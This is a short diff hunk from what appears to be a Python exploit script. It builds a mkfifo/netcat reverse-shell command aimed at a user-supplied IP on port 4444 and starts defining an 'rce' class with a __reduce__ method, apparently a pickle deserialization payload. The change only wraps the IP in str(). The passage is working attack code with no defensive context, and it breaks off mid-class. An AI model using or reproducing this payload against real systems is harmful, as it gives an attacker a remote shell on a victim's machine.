@@ -16,7 +16,7 @@ if not re.match(r'[0-9]+(?:\.[0-9]+){3}', ip):
     print('Invalid IP format')
 
 
-command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat' + ip + '4444 > /tmp/f'
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat' + str(ip) + '4444 > /tmp/f'
 
 class rce(object):
     def __reduce__(self):
